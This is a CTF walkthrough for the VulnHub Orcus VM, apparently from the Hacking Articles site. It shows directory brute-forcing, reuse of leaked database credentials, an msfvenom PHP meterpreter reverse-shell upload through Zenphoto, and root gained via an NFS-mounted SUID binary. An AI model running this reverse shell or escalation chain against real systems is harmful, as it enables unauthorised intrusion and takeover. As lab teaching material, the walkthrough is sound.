<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/vulnhub/" rel="category tag">VulnHub</a></span>            </div>
            <h1 class="post-title entry-title">Hack the Orcus VM CTF Challenge</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/hack-orcus-vm-ctf-challenge/" rel="bookmark"><time class="entry-date published" datetime="2017-04-26T15:46:19+00:00">April 26, 2017</time><time class="updated" datetime="2025-06-10T20:30:13+00:00">June 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">Hello friends! Today again we are here with a new vulnerable hub challenge “ORCUS” design by Mr. Viper. Through this article, we are sharing our work efforts which we have utilized to complete the challenge so that we can catch the flag and beat the goal of this VM machine. This machine contains 4 flags on this machine 1. Get a shell 2. Get root access 3. There is a post-exploitation flag on the box 4. There is something on this box.</span></p>
<p><span style="color: #000000;">You can download it from <a style="color: #000000;" href="https://download.vulnhub.com/hackfest2016/Orcus.ova.torrent"><strong>here</strong></a>.</span></p>
<p><span style="color: #000000;"><strong> </strong><strong>Let’s Breach!!</strong></span></p>
<p><span style="color: #000000;">192.168.0.151 is the target IP now as we know that enumeration must be the first step for gathering information of any victim so therefore I had used version scan through nmap.</span></p>
<pre class="lang:default decode:true">nmap -p- -sV 192.168.0.151</pre>
<p><span style="color: #000000;">From screenshot you can see there are so many open ports but I will go with port 80.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-qguAb114ldg/WQC9k4VyYfI/AAAAAAAAP2Q/pnfNjmxi7SwyESBHdJKimVe5qiap32BAwCLcB/s1600/1.png"/></span></p>
<p><span style="color: #000000;">Since port 80 was opened therefore I had explore target IP 192.168.0.151 in the browser but here I didn’t get any remarkable thing.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-97iS9qJQBxY/WQC9mspOamI/AAAAAAAAP2w/F-eynxDhQe0hJcuqWmU5VIwBoA42sFvXQCLcB/s1600/2.png"/></span></p>
<p><span style="color: #000000;">Without wasting time I choose another tool <strong>dirb</strong> for directories brute force attack. To start brute force attack for directories open the terminal and type following:</span></p>
<pre class="lang:default decode:true">dirb http://192.168.0.151</pre>
<p><span style="color: #000000;">Awesome! We have stepped up in the right direction and dug out many directories but when you will see the given screenshot there I had highlighted the “<strong>backups</strong>” directories. So now I will go with backups directory.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-RTSPePzsu1w/WQC9nyOyg7I/AAAAAAAAP3E/NORciNkmZZwYTZYK4BtvdzUub-gR0LHXgCLcB/s1600/3.png"/></span></p>
<p><span style="color: #000000;">In the browser, I explored <strong>192.168.0.151/backups</strong> as URL, where I found a tar file “simple PHP Quiz-backup.tar.gz”. Without taking more time I just download it for further enumeration.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-QXHc0HbcNsw/WQC9nxrKTCI/AAAAAAAAP3I/ujLDL8CEikkwgH5YdlFn_1ayZM4LYHZ5QCLcB/s1600/4.png"/></span></p>
<p><span style="color: #000000;">So after unzipping when I open it, I found php and html files inside it, keeping eyes on php files I <strong>choose db-conn.php</strong> for fetching more details in the hop to get something related to the database.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-yjHDJXaqGIA/WQC9n-lBhyI/AAAAAAAAP3M/LEi_9NlM2hse05K5VoMXpi7w_EgEyKWcACLcB/s1600/5.png"/></span></p>
<p><span style="color: #000000;">Finally, after making many efforts I found database username and password as <strong>dbuser: dbpasswords</strong> respectively.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-SIk3OGEQgho/WQC9ocxbuNI/AAAAAAAAP3Q/6k-j_qcBNUM1GpIDNBSDQ_moDuXZLO_4QCLcB/s1600/6.png"/></span></p>
<p><span style="color: #000000;">In dirb brute force attack, we have found many directories once again if you will scroll up you will notice phpmyadmin directory in the above-given screenshot. Now again I will move towards the browser to explore <strong>192.168.0.1.51/phpmyadmin</strong> in URL. The form is given below screenshot you can observe I had entered above username and password here.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-LeQkChELQFE/WQC9oqUgsLI/AAAAAAAAP3U/apkelWs3224reVwHUd7B9VtMJIZe4MktACLcB/s1600/7.png"/></span></p>
<p><span style="color: #000000;">When you will give correct login credential it will allow you to login inside phpmyadmin page. From the screenshot you can see I have successfully login inside it using above credential, here I found a database “zenphoto” and decided to move inside it for further details.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-ZK7LoC92WBg/WQC9ojClovI/AAAAAAAAP3Y/fERoixZhgWkponeUHu3LdmCnZV-2vhJNACLcB/s1600/8.png"/></span></p>
<p><span style="color: #000000;">Now inside zenphoto, I found a setup page which will update the configuration file for the database inside web server when we will fill the information in the given text field.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-7a4GarMYtpE/WQC9o0MafpI/AAAAAAAAP3c/AMnsoyxn9k4hGpI2ifKLbWBWoRVQjHckgCLcB/s1600/9.png"/></span></p>
<p><span style="color: #000000;">Here only we need to provide database username i.e.<strong> dbuser</strong> and database password i.e. <strong>dbpassword</strong></span></p>
<p><span style="color: #000000;">Without disturbing other fields <strong>click</strong> on<strong> save</strong> which will start database zenphoto installation.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-602ypXXtjTo/WQC9kqJMVrI/AAAAAAAAP2I/_R8MRspcusIgPRcb_lnp9vGna2EDK2I8ACLcB/s1600/10.png"/></span></p>
<p><span style="color: #000000;">This will start installation when you will <strong>click</strong> on the<strong> go</strong> tab given at the end of the page. The zenphoto setup will start installing theme and plug-in for your database after that you have to <strong>set your admin user and password.</strong></span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-GMol8bn7qRg/WQC9khxuqBI/AAAAAAAAP2M/imDbRlQA5pwOXVQ6X4xN-8QE-rWMwg0GgCLcB/s1600/11.png"/></span></p>
<p><span style="color: #000000;">A further <strong>click</strong> on the given tab <strong>I agree to these terms and condition</strong>.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-1IcnfsUZfkw/WQC9lZhuPUI/AAAAAAAAP2U/3uKOhFkYVCU_KnVGeMjrMsrpOKCt6upcQCLcB/s1600/12.png"/></span></p>
<p><span style="color: #000000;">Now type a name for a new user as <strong>admin </strong> and type password: <strong>password</strong> and confirm password as shown in below image and then <strong>click</strong> on the <strong>apply</strong> tab given at the top </span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-qcWzDxz6-A4/WQC9lVvpgsI/AAAAAAAAP2Y/jBUndngzpzMNxAJDt2cjh9NSj_Iq66Z0ACLcB/s1600/14.png"/></span></p>
<p><span style="color: #000000;">Then login into the zenphoto database using credential as <strong>admin: password</strong>. So now we are inside admin console where we have decided to upload an image but here we upload any zip file only.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-zgb7PEUd28c/WQC9lqFEY3I/AAAAAAAAP2c/3HwAcEsLQgsKfm0UIjR1Z4gUmqxeJCzOgCLcB/s1600/15.png"/></span></p>
<p><span style="color: #000000;">Now use <strong>msfvenom</strong> to generate malicious PHP script and type following command.</span></p>
<pre class="lang:default decode:true">msfvenom –p php/meterpreter/reverse_tcp lhost=192.168.0.107 lport=4444 -f raw</pre>
<p><span style="color: #000000;">From the screenshot you can read the generated PHP script, at this instant we need to <strong>copy</strong> the text highlighted text<strong> </strong>further we will <strong>paste</strong> it inside text document and saved with <strong>shell.php</strong> after that create a new folder copy shell.php inside it and <strong>compress</strong> it.</span></p>
<p><span style="color: #000000;"> Most important thing is to start<strong> </strong><strong>multi handler</strong><strong> </strong>inside Metasploit<strong>.</strong></span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-PujbOaRIuGg/WQC9l2XnGYI/AAAAAAAAP2g/5awl1HyPNRsHCzlkoeec2s8v6niMr33VACLcB/s1600/16.png"/></span></p>
<p><span style="color: #000000;">Then come back to the Browser to upload your zip file, now <strong>browse your file</strong> and <strong>click</strong> on <strong>upload</strong>. Then explore following URL 1<strong>92.168.0.151/zenphoto/albums, </strong>from the given image you can see our <strong>shell.php</strong> is successfully uploaded now click on it.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-vglqCfR-U0I/WQC9mN3RuJI/AAAAAAAAP2k/6QZrFfgol7MkvuCN_NRYPxql2tGqADdYQCLcB/s1600/17.png"/></span></p>
<p><span style="color: #000000;">When you will click on shell.php you will get meterpreter session inside Metasploit. Now type the following command in order to catch the flag.</span></p>
<pre class="lang:default decode:true ">meterpreter &gt;cd /var/www
meterpreter &gt;ls
meterpreter &gt;cat flag.txt</pre>
<p><span style="color: #000000;"><strong>Congrats! We have caught the 1<sup>st</sup> flag.</strong></span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-Y8vBT3q6w0o/WQC9mDVi22I/AAAAAAAAP2o/O1TLTsndu401A-AVfCM75Yv59HXb2WXLQCLcB/s1600/18.png"/></span></p>
<p><span style="color: #000000;">After so many efforts I found a folder kippo then I step towards it for more information.</span></p>
<pre class="lang:default decode:true">meterpreter &gt;pwd
meterpreter &gt;cd ..
meterpreter &gt;cat /etc/kippo/data/userdb.txt</pre>
<p><span style="color: #000000;"><strong> Finally! Caught 2<sup>nd</sup> flag also.</strong></span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-SwSLKGEMHUs/WQC9mV4oUfI/AAAAAAAAP2s/N5bvJyDWIZoQl3HTBup4DApPN_EIpDXPgCLcB/s1600/19.png"/></span></p>
<p><span style="color: #000000;">Now for root privilege escalation open a text document and following: reference</span></p>
<p><span style="color: #000000;"><strong>https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#suid-binary</strong></span></p>
<p><span style="color: #000000;">Then save it as <strong>raj.c </strong>on the desktop.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-c7bnlyZuhpk/WQC9m_82oFI/AAAAAAAAP20/HXsUUGgqA5g30LgXISYIddX4t1s3oiSAQCLcB/s1600/20.png"/></span></p>
<p><span style="color: #000000;">Now upload raj.c file for compiling and gain root access as shown in the following image.</span></p>
<pre class="lang:default decode:true">meterpreter &gt;upload /root/Desktop/raj.c .
meterpreter &gt;shell
gcc -o raj raj.c</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-E1AMeQn9Tbk/WQC9nEc_bSI/AAAAAAAAP24/aYKInGes57s-d5SDAHF3RoBSZpZ7b-9RACLcB/s1600/21.png"/></span></p>
<p><span style="color: #000000;">Since we know from the nmap result <strong>nfs port</strong> was <strong>open</strong> in targeted IP so taking advantage of it we will mount tmp data in URL Kali Linux. Now create a folder mount data inside it.</span></p>
<pre class="lang:default decode:true ">mount -t nfs 192.168.0.151:/tmp mount
chown root:root raj
chmod u+s raj</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-_LNKAB_xgg4/WQC9nCY0PTI/AAAAAAAAP28/G_Xw7pfdPRUK0poawoc0Vk6TrEmE08wlgCLcB/s1600/22.png"/></span></p>
<pre class="lang:default decode:true ">./raj
id
cd /root
cat flag.txt</pre>
<p><span style="color: #000000;"><strong>Great!! We have Caught 3<sup>rd</sup> flag also.</strong></span></p>
<p><span style="color: #000000;">Now try yourself to find out one more flag.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-uXIyE_Cy5i4/WQC9nZMgPqI/AAAAAAAAP3A/1S5uam2_Pj8ZOIACcrw3XcoO2jmv5VYOACLcB/s1600/23.png"/></span></p>
<p><span style="color: #000000;"><strong>Author</strong>: Aarti Singh is a Researcher and Technical Writer at Hacking Articles an Information Security Consultant Social Media Lover and Gadgets. Contact<a style="color: #000000;" href="https://www.linkedin.com/in/aarti--singh/"><strong> here</strong></a></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
